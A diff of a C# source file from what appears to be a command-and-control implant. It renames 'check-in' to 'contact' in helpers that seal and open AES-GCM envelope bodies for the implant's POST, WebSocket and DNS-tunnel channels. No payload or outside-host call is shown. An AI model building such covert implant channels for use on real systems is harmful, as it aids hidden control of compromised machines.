@@ -4,7 +4,7 @@ using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// The envelope wire helpers shared by every web check-in client: the
+// The envelope wire helpers shared by every web contact client: the
 // delimited-frame codec and the sealed-body shapes (extending/implants.md).
 // A whole source file that is never trimmed -- both web modules (the POST
 // cycle and the WebSocket stream) compile against it, so it stays in every
@@ -24,7 +24,7 @@ internal static class EnvelopeWire
     /// <summary>
     /// Splits the baked envelope key (standard base64 of keyId(16) ||
     /// key(32)) into its halves, or null when malformed -- a bad bake falls
-    /// back to the plaintext frame rather than checking in undecodably.
+    /// back to the plaintext frame rather than contacting undecodably.
     /// </summary>
     public static (byte[] KeyId, byte[] Key)? ParseBakedKey(string baked)
     {
@@ -45,17 +45,17 @@ internal static class EnvelopeWire
     }
 
     /// <summary>
-    /// The sealed check-in wire shape: base64 of
+    /// The sealed contact wire shape: base64 of
     /// b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), returned as
     /// the bytes to send (base64 text -- the body reads as an opaque string,
     /// not a structured binary).
     /// </summary>
-    public static byte[] SealCheckInBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
+    public static byte[] SealContactBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
         => System.Text.Encoding.UTF8.GetBytes(
             Convert.ToBase64String(SealBody(plaintext, keyId, key, aad)));
 
     /// <summary>
-    /// The byte-level form <see cref="SealCheckInBody"/> base64s: the raw
+    /// The byte-level form <see cref="SealContactBody"/> base64s: the raw
     /// <c>b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16)</c> body.
     /// The DNS carriage carries this form -- its labels are already base32,
     /// and a text encoding inside another would double the expansion.
@@ -85,13 +85,13 @@ internal static class EnvelopeWire
     }
 
     /// <summary>
-    /// Opens what <see cref="SealCheckInBody"/> sealed under the same key id
+    /// Opens what <see cref="SealContactBody"/> sealed under the same key id
     /// and purpose tag: authenticates the GCM tag and returns the plaintext,
     /// or null on any mismatch (wrong key, tampered bytes, foreign shape) --
     /// the caller drops the whole cycle rather than acting on a partial
     /// read.
     /// </summary>
-    public static byte[]? TryOpenCheckInBody(byte[] body, byte[] keyId, byte[] key, string aad)
+    public static byte[]? TryOpenContactBody(byte[] body, byte[] keyId, byte[] key, string aad)
     {
         byte[] packed;
         try
@@ -106,7 +106,7 @@ internal static class EnvelopeWire
     }
 
     /// <summary>
-    /// The byte-level form <see cref="TryOpenCheckInBody"/> decodes into:
+    /// The byte-level form <see cref="TryOpenContactBody"/> decodes into:
     /// opens a raw R1 body under the same key id and purpose tag, or null on
     /// any mismatch (wrong key, tampered bytes, foreign shape). The DNS
     /// carriage's poll answers arrive in this form.
